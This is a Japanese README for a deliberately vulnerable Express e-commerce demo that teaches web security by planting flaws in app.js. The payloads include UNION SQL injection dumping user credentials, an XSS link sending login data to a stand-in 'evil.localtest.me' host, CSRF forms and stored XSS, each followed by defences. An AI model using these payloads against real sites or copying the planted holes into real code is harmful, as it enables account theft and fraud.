# express-store

JavaScriptのWebアプリフレームワークExpressを使ったECサイトのデモンストレーションです。ソースコードを編集して脆弱性をわざと仕込むことで、どんな攻撃が可能になるかを示していきます。

OSはWindows、WebブラウザーはFirefoxを利用します。

デモンストレーションを理解するのに必要な基礎知識は次の通りです：

- [Webセキュリティについての基礎知識](/web-security.md)
- [Webアプリケーションフレームワークについての基礎知識](/web-application-framework.md)
- [Expressの使い方](/express-tutorial.md)

## デモのはじめかた（Docker）

Dockerをインストールします。docker-composeでビルドと起動をします。

```console
docker-compose build
docker-compose up
```

Firefoxで http://localhost:8080/ にアクセスすると使えます。

利用者1でログインしてみます。

- メールアドレス
  - user1@example.com
- パスワード
  - password1

ログインに成功すると、商品一覧が表示されます。URLは`http://localhost:8080/products`です。

商品の詳細ページでは、商品の購入とレビューの投稿ができます。URLは`http://localhost:8080/products/1`です。

なお、購入は簡易的な実装で、アラートが表示されるだけです。
レビューは評価とコメントを投稿できます。投稿したものを削除することもできます。

ログインすると、nicknameとuserIdをクッキーに保存します。Webブラウザーのデベロッパーツールで確認すると（Applicationタブ > Storage > Cookies）、クッキーの値は暗号化されていることが分かります。

## ここから先の注意事項

不正アクセス禁止法に抵触するため、外部サービスに対してはここから先に書いてあることを試してはいけません。絶対にやめてください。

また、脆弱性を仕込む前のコードも安全とは言えません。例えば、ローカル環境で動作させることを優先するため、クッキーのsecure属性をtrueにしていません。暗号化されていないHTTP通信でもクッキーがやり取りされるため、中間者攻撃によってなりすましができてしまいます。このコードを流用された場合に発生するいかなる被害に対しても、責任も負うことができません。ご承知おきください。

## システム構成

ここでは攻撃者はまだ不正アクセスに失敗して、ECサイトを自由に改ざんすることはできない、という前提です。攻撃者はECサイトとは別の攻撃用サイトを準備していると仮定します。

ECサイトと、攻撃用サイトはそれぞれ別のサイト名（ドメイン名）を持っています。ローカル環境で2つのサイトを動作させてデモします。ECサイトは```localhost:8080```で、攻撃用サイトは```localhost:8081```としますが、どちらも同じlocalhostだと分かりづらいので、攻撃用サイトには別名をつけて```evil.localtest.me:8081```を使います。

なお```localtest.me```はループバックドメインと呼ばれる、開発用のドメイン名です。

> Scott Forsyth's Blog - Introducing Testing Domain - localtest.me
> 
> https://weblogs.asp.net/owscott/introducing-testing-domain-localtest-me

localhostに別名を割り当てるのによく使うのはhostsファイルですが、hostsファイルを変更するのには管理者権限が必要で、かつ、元に戻すのを忘れがちです。ループバックドメイン名は、DNSによってループバックアドレス```127.0.0.1```として解決されます。なので、Firefoxで```*.localtest.me```にアクセスするのは、localhostにアクセスするのと同じです。

他には```lvh.me```というドメイン名が有名です。ただし、これらのドメインはドメインの管理者の気まぐれでいつ使えなくなってもおかしくないので注意してください。

## このデモで試す脆弱性

- Step1: SQLインジェクション
- Step2: 反射型クロスサイトスクリプティング（XSS）
- Step3: クロスサイトリクエストフォージェリ（CSRF）
- Step4: 蓄積型XSS
- Step5: クリックジャッキング

## 1. SQLインジェクション

ここからは、未熟な開発者がバグを埋め込んでしまった、と仮定して、バグありのコードに書き換えていきます。

`Step1`で検索して、`app.js`を次のように書き換えます。プレースホルダ`?`（はてな）を使わずに、文字列を連結してSQL文を作ってしまっています。

```diff
        // Step1: SQLインジェクション対策
-        db.all("SELECT * FROM rated_products WHERE name LIKE ?;", "%" + query + "%", (err, rows) => {
+        db.all("SELECT * FROM rated_products WHERE name LIKE '%" + query + "%'", (err, rows) => {
```

Firefoxで商品一覧を表示します。

<a target="_blank" href="http://localhost:8080/products">http://localhost:8080/products</a>

商品名で検索ができます。例えば、検索欄に`1`を入力して検索すると商品1が表示されます。
攻撃者は内部の動作を想像し、システムが次のようなSQL文を使っているのではないか？と推測します。

```sql
SELECT * FROM <商品テーブル名> WHERE <商品名カラム> LIKE '%<検索文字列>%';
```

攻撃者は外部から入力される検索文字列の扱いが雑なことを期待して、```'```（シングルクォート）で検索してみます。
```app.js```を変更する前のプレースホルダを使った場合では問題ないのですが、検索文字列をエスケープせずにそのまま使った場合のSQL文は次のようになります。

```sql
SELECT * FROM <商品テーブル名> WHERE <商品名カラム> LIKE ''%';
```

攻撃者の期待通りなら、LIKEの条件が間違ったおかしなSQL文となり、エラーが表示されるはずです。
では、シングルクォートで検索してみましょう。次の URL にアクセスしても構いません。

<a target="_blank" href="http://localhost:8080/products?q='">http://localhost:8080/products?q='</a>

すると、Error: 500 Internal Server Errorが表示されます。攻撃者が入力した文字列がエスケープされることなく、そのままSQL文として使われてしまう脆弱性があることが示唆されました。この脆弱性を使った攻撃をSQLインジェクションと呼びます。

SQLインジェクションが可能なことに気がついた攻撃者は、データベースで管理しているテーブルの情報（メタ情報）を引き出そうと試みます。SQLiteの場合は、特別なテーブル```sqlite_master```からメタ情報を引き出すことができます。

> The Schema Table
> 
> https://sqlite.org/schematab.html

攻撃者はメタ情報を引き出すために、次のSQL文を組み立てることを期待して、検索文字列を調整します。

```sql
SELECT * FROM <商品テーブル名> WHERE <商品名カラム> LIKE '%x' UNION SELECT 1, tbl_name, sql, 1, 1, 1 FROM sqlite_master--%';
```

UNIONは2つのSELECTを統合するときに使います。前半のSELECTでは「xで終わる商品」を検索しています。後半のSELECTでは、テーブル名```tbl_name```と、そのテーブルを作成する時に使ったsqlを検索しています。

なお後半のSQLは結果が6列になるよう、4つの```1```を使って調整しています。画面から分かるカラム数は5列ですが、それに加えてIDのための列を1つ追加し、6列にしています。また、最後にある```--```はそれ以降のSQL文をコメントとして扱います。それ以降のSQL分を無効にする効果があります。

よって、検索する文字列は```x%' UNION SELECT 1, tbl_name, sql, 1, 1, 1 FROM sqlite_master--```となります。これを検索窓に入力するか、パーセントエンコードした以下のURLにアクセスします。

<a target="_blank" href="http://localhost:8080/products?q=x%25%27+UNION+SELECT+1%2C+tbl_name%2C+sql%2C+1%2C+1%2C+1+FROM+sqlite_master--">http://localhost:8080/products?q=x%25%27+UNION+SELECT+1%2C+tbl_name%2C+sql%2C+1%2C+1%2C+1+FROM+sqlite_master--</a>

画面に表示される検索結果から、usersテーブルがあることと、そのカラム名が分かりました。ここからさらに情報を引き出します。検索する文字列は`x%' UNION SELECT 1, id, email, 1, hashed_password, nickname FROM users--`です。

<a target="_balnk" href="http://localhost:8080/products?q=x%25%27+UNION+SELECT+1%2C+id%2C+email%2C+1%2C+hashed_password%2C+nickname+FROM+users--">http://localhost:8080/products?q=x%25%27+UNION+SELECT+1%2C+id%2C+email%2C+1%2C+hashed_password%2C+nickname+FROM+users--</a>

usersテーブルのid、email、hashed_password、nicknameが漏洩してしまいました。かろうじてパスワードをハッシュ化していましたが、平文で保存していたら目も当てられません。

### SQLインジェクションを防ぐには

絶対にプレースホルダーを使いましょう！

### 参考情報

> SQLインジェクションによりクレジットカード情報を盗むデモンストレーション（Type1）
> 
> https://www.youtube.com/watch?v=Vvgmeu128ak
> 
> [![](http://img.youtube.com/vi/Vvgmeu128ak/0.jpg)](http://www.youtube.com/watch?v=Vvgmeu128ak "")

## 2. 反射型クロスサイトスクリプティング（Reflected XSS）

それでは、次のバグを埋め込んでみます。たった1文字が紛れ込むことで、攻撃が可能になってしまう例です。

`Step2`で検索して`app.js`を次のように書き換えます。画面に表示する変数`message`のエスケープ漏れです。EJSのテンプレートで`<%- %>`は、変数をエスケープせず生のまま表示することを意味します。


```diff
<!-- Step2: XSS対策 -->
-<p style="color:red;"> <%= message %> </p>
+<p style="color:red;"> <%- message %> </p>
```

攻撃者は、ログイン画面でURLのquery parameterとして渡した文字列が画面に表示されていることに着目し、query parameterの扱いが雑になっていることを期待して、次のようなURLでアクセスしてきます。HTMLで```\<s\>```タグは取り消し線を意味します。

<a target="_blank" href="http://localhost:8080/login?message=<s>hello</s>">http://localhost:8080/login?message=\<s\>hello\</s\></a>

取り消されたhelloが表示され、エスケープ漏れがあることが分かりました。次に期待するのはスクリプトの混入です。

<a target="_blank" href="http://localhost:8080/login?message=<script>alert(1)</script>">http://localhost:8080/login?message=\<script\>alert(1)\</script\></a>


`1`がアラートされ、スクリプトの混入に成功したことが分かります。このように、別のサイト（クロスサイト）からスクリプトを混入できる脆弱性を狙った攻撃を、クロスサイト・スクリプティング（Xross Site Scripting: XSS、もしくは、Cross Site Scripting: CSS）と呼びます。

上記したように、URL自体にスクリプトを混入するXSSは反射型（Reflected）XSSと呼ばれます。詳しくは後ほど解説します。

攻撃者は自分の持つ攻撃用サイトを立ち上げ、正規の利用者が正規のログイン画面に入力した情報を盗み出すことを思いつきます。

攻撃用サイトを起動するには、別のコマンドプロンプトを立ち上げて、`evil.js`を実行します（Dockerを使っている場合すでに起動しています）。成功すればevil.localtest.meというホスト名の8081ポートで起動します。起動に失敗したり、起動できてもFirefoxからアクセスできない場合には、すでに8081番ポートが使われている可能性があります。例えば、8082など、別のポート番号にコードを書き換えて起動しなおしてください。`evil.js`の`PORT`の値を変更します。

```console
$ node evil.js
```

XSSが成功すると、攻撃者がログイン画面にスクリプトを混入できるので、同じログイン画面にもかかわらずフォームの登録先サーバーを変更できてしまいます。正規の利用者が次のURLをクリックすると、画面上は何も変わりがありませんが、実は向き先の変わっているログイン画面が表示されます。

<a target="_blank" href="http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://evil.localtest.me:8081/users'}</script>">http://localhost:8080/login?message=\<script\>window.onload=function(){document.querySelector('form').action='http://evil.localtest.me:8081/users'}\</script\></a>

上記のURLに仕込まれているスクリプトを書き下すと、次のようになります。

```javascript
window.onload = function() {
  document.querySelector('form').action='http://evil.localtest.me:8081/users'
}
```

window.onload はページの読み込みが終了すると実行されます。フォームの```action```属性を攻撃者のサイト```evil.localhost.me```に変更しています。

攻撃者はこのスクリプトが混入したURLを、正規の利用者に何とかクリックさせようと試みます。例えば、攻撃用サイトを使って、甘い言葉で正規の利用者にクリックを促します。

<a target="_blank" href="http://evil.localtest.me:8081/game0">http://evil.localtest.me:8081/game0</a>

利用者が送信ボタンを押してしまうと入力した情報が攻撃者に渡ってしまいます。攻撃者が盗み出した情報をFirefoxで確認してみましょう。これまでに集めた情報の一覧が表示されます。

<a target="_blank" href="http://evil.localtest.me:8081/users">http://evil.localtest.me:8081/users</a>

### XSSを防ぐには

意図しないエスケープ漏れをなくしましょう！

攻撃者は様々な手法で不正アクセスを試みます。XSSのゲームを通じて手法を学びつつ、セキュリティ診断ツールも活用してセキュリティを確保しましょう。

- XSS game https://xss-game.appspot.com/
- prompt(1) to win - 0x0 https://prompt.ml/0

### 反射型XSSのさらなる対策

Webブラウザーが持つセキュリティ機能を、Webアプリ側が強制的に有効にする方法があります。

- Content-Security-Policyヘッダー
  - 様々なセキュリティポリシーを設定できます。例えば、全てのリソースを同じドメインからのみ取得させるには次のように指定します。
  - ```Content-Security-Policy: default-src 'self'```

> コンテンツセキュリティポリシー (CSP) - HTTP | MDN
> 
> https://developer.mozilla.org/ja/docs/Web/HTTP/CSP

## 3. クロスサイト・リクエストフォージェリ（CSRF）、4. 蓄積型クロスサイトスクリプティング（Persistent XSS）の合わせ技

このセクションはWebブラウザーにFirefoxを使います。

`Step3`で検索して、`app.js`を次のよう書き換えます。

```diff
            // Step3: CSRF対策
-            res.cookie('userId', row.id, { signed: true, path: '/', httpOnly: true, secure: true, sameSite: 'lax' })
-            res.cookie('nickname', row.nickname, { signed: true, path: '/', httpOnly: true, secure: true, sameSite: 'lax' })
+            res.cookie('userId', row.id, { signed: true, path: '/', httpOnly: true, secure: true, sameSite: 'none' })
+            res.cookie('nickname', row.nickname, { signed: true, path: '/', httpOnly: true, secure: true, sameSite: 'none' })
```

クッキーのsamesite属性について良く知らないまま、laxを指定すべきところを、noneを指定してしまいました[^1]。
このことで、正規のサイトとは別に作られた、別のサイト上のフォームから、正規のサイトにPOSTメソッドでデータの登録が可能になってしまいます。samesite属性が無効になっていると、どのサイトに向けても過去に集めたクッキーをリクエストに付与して送信してしまうからです。

> samesite | Cookies(クッキー), document.cookie
> 
> https://ja.javascript.info/cookie#ref-497

[^1]: SameSite属性には`Strict`、`Lax`、`None`の3つの値があります。`Strict`は完全にクロスサイトのリクエストにクッキーを送信しない設定、`Lax`は一部のクロスサイトリクエスト（例えばGETメソッド）にクッキーを送信する設定、`None`は全てのクロスサイトリクエストにクッキーを送信する設定です。`None`を使用する場合は、クッキーに`Secure`属性を付ける必要があります。`Secure`属性なしで`None`を指定した場合、`Lax`として処理されます。

このECサイトは、署名付きクッキーを認証に使っています。署名付きクッキーとは、電子署名が施されたクッキーで、例えばブラウザーの開発者ツール（DevTools）を使うなどして、第三者が値を変更（改ざん）するとクッキーの値が読み込めなくなります。ECサイトのWebアプリはこのクッキーが読み取れるかどうかで認証をし、アクセスを許可しています。しかし、samesite属性が設定されていないと、ECサイト以外の画面から送信されたリクエストに、このクッキーが付与されてしまうので、ECサイトは認証を通してしまうのです。

利用者がWebブラウザーで正規のサイトのフォームを開いてから情報を投稿するのが正規の流れですが、別サイト（クロスサイト）経由での投稿ができるようになってしまいました。この脆弱性を狙った攻撃を、クロスサイト・リクエストフォージェリ（Cross Site Request Forgery: CSRF）と呼びます。Forgeryは偽造を意味し、外部サイトからあたかも正規のリクエストを偽造できてしまうことを指します。

攻撃者は攻撃用サイトを準備し、甘い言葉で正規の利用者にクリックを促します。

<a target="_blank" href="http://evil.localtest.me:8081/game1">http://evil.localtest.me:8081/game1</a>

クリックすると、利用者が意図しない投稿をしてしまうフォームになっています。評価を釣り上げる作戦です。

```html
<form action="http://localhost:8080/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="最高の商品です！本当は★100を付けたいくらい！" />
  <input type="submit" value="遊んでみる" />
</form>
```

利用者はゲームで遊ぼうと攻撃者のサイトでボタンをクリックしただけなのに、商品1に高評価をつけてしまいます。別のサイトに利用者をアクセスさせて、利用者が意図しない投稿をさせてしまいます。

（攻撃者の準備したフォームにあるuser_idはSQLインジェクションで入手したものを使っている前提です）

意図しない投稿は商品1のレビューです。確認してみます。

<a target="_blank" href="http://localhost:8080/products/1">http://localhost:8080/products/1</a>

なお、samesite属性のデフォルト値はlaxなので、samesite属性そのものを削除しているのであればこの攻撃が成立せず、ログインが求められることになります。

さらに`Step4`で検索して`app.js`を書き換え、`comment`のエスケープを外します。これで、商品の詳細ページにXSSが可能になってしまいます。

```diff
    <!-- Step4: XSS対策 -->
-    <li><%= comment %></li>
+    <li><%- comment %></li>
```

攻撃者は攻撃用サイトを準備し、甘い言葉で正規の利用者にクリックを促します。

<a target="_blank" href="http://evil.localtest.me:8081/game2">http://evil.localtest.me:8081/game2</a>

クリックすると、利用者が意図しない投稿をしてしまうフォームになっています。評価を釣り上げるだけでなく、XSSを埋め込んでうその金額にページを書き換えてしまいます。

```html
<form action="http://localhost:8080/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="本当は★100を付けたいくらい最高の商品なのに、今だけ100円で売ってます！！<script>window.onload=function(){
      var td = document.querySelectorAll('tr td')[7];
      td.innerHTML = '<s>' + td.innerHTML + '</s><b>今だけ100円！！</b>';
  }</script>" />
  <input type="submit" value="遊んでみる" />
</form>
```

再び、商品1の詳細ページを確認してみましょう。

<a target="_blank" href="http://localhost:8080/products/1">http://localhost:8080/products/1</a>

利用者が意図せずに投稿してしまったスクリプト付きコメントは、利用者本人はもちろん、他の利用者がこのコメントを閲覧した時にも実行され、金額を書き換えてしまいます。

このXSSは蓄積型XSSと呼ばれます。先ほど紹介した反射型XSSは、スクリプトが仕込まれたURLをクリックした人だけに影響しました。しかし、蓄積型XSSはその他すべての人に影響してしまいます。

### CSRFを防ぐには

クッキーを使って認証している場合には、クッキーのsamesite属性を利用しましょう。ただし、```samesite='lax'```の場合は、GETメソッドで情報を更新する機能（例えば「既読にする」のように情報の参照に加えて情報を更新する副作用が発生する機能）を実装してはいけません。GETメソッドの場合にもクッキーが付与されるためです。

また、Internet Explorerをはじめとする古いWebブラウザーはsamesite属性に対応していません。

> SameSite cookies - HTTP | MDN
> 
> https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie/SameSite

古いWebブラウザーを利用させるのであれば、トークンを利用した対策が必要になります。攻撃者が推測できないランダム文字列のトークンを準備し、利用者が情報を投稿するフォームとクッキーにそれぞれ埋め込んでおきます。

```python
from secrets import token_urlsafe
...
csrf_token = token_urlsafe()
request.set_cookie('csrf_token', csrf_token, secret=SECRET_KEY, httponly=True, path='/', samesite='lax')
return template('''
<form action='/reviews' method="post">
  ...
  <input type="hidden" name="csrf_token" value="<%= csrf_token %>" />
</form>
''', csrf_token=csrf_token)
```

そしてPOSTされた情報のトークンを確認します。

```python
form_token = request.forms.token
cookie_token = request.get_cookie('csrf_token', secret=SECRET_KEY)
if form_token != cookie_token:
    abort(400, '不正なアクセスです。')
```

せっかくトークンを導入しても、トークンのチェックを忘れると脆弱性になってしまうので注意してください。

また、Single Page Application（SPA）のように、非同期型のWebアプリの場合はCross Origin Resource Sharing（CORS）を導入し、HTTPのOriginヘッダーを検証することで正規の投稿かどうかを判断します。CORSではWebブラウザーからのリクエスト自体はサーバーに届いているため、CSRF攻撃が成功しないよう注意してください。

> オリジン間リソース共有 (CORS) - HTTP | MDN
> 
> https://developer.mozilla.org/ja/docs/Web/HTTP/CORS

> CORSの原理を知って正しく使おう 14:55
> 
> https://www.youtube.com/watch?v=ryztmcFf01Y
> 
> [![](http://img.youtube.com/vi/ryztmcFf01Y/0.jpg)](http://www.youtube.com/watch?v=ryztmcFf01Y "")

## 5. クリックジャッキング（Clickjacking）

このセクションはWebブラウザーにFirefoxを使います。

前のセクションでクッキーのsamesite属性をnoneにした後に、`Step5`で検索して`app.js`を次のよう書き換えます。X-Frame-Optionsヘッダーのヘッダー名を間違え、sを抜かしたX-Frame-Optionにしてしまいました。

```diff
    // Step5: Clickjacking対策
-    res.header('X-Frame-Options', 'DENY')
+    res.header('X-Frame-Option', 'DENY')
```

HTMLの`\<iframe\>`タグを使うことで、別のサイトのWebページを自サイト上に掲載することができます。X-Frame-Optionsヘッダーは、別のサイトがiframe内にそのページを表示してよいかどうかを設定します。ヘッダー名を間違えてしまったので有効にならず、誰でもそのページをiframe内に表示することができるようになってしまいました。

攻撃者は攻撃用サイトを準備し、甘い言葉で正規の利用者にクリックを促します。

<a target="_blank" href="http://evil.localtest.me:8081/game3">http://evil.localtest.me:8081/game3</a>

攻撃用サイト上には、iframeで商品一覧ページが表示されていますが、消すチェックボックスを有効にすると、商品一覧ページが消えてしまいます。実際は消えているのではなく、CSSで透明度を変更し、見えなくしているだけで、そこに存在しています。正規の利用者がボタンをクリックすると、勝手に商品を購入してしまいます。

クリックする対象を隠すことで、意図しない結果を誘発するこの攻撃手法はクリックジャッキングと呼ばれています。

### Clickjackingを防ぐには

X-Frame-Optionsヘッダーを正しく設定しましょう！

## ツールを活用しよう！

ここで紹介した攻撃は代表的なもので、かつ、ごく一部です。全ての脆弱性を人間が見つけるのは大変困難です。そこで登場するのがセキュリティ診断ツールです。ツールを活用すれば、網羅的かつ効率的に脆弱性を見つけることができます。

例えば、無料で使えるWebセキュリティ診断ツールにOWASP ZAPがあります。

> OWASP Zed Attack Proxy
> 
> https://www.zaproxy.org/

ただ、脆弱性とその攻撃に関する知識がなければ、ツールを使いこなすことはできません。ツールがどうやって脆弱性を探しているのかが分からなければ、ツールへの適切な入力ができません。また、ツールから出力された診断結果を読み解いて対処するためには、脆弱性とその攻撃に関する知識が必要です。

今回学んだことを土台にして、情報セキュリティを確保する方法についてぜひ学び続けていってください。
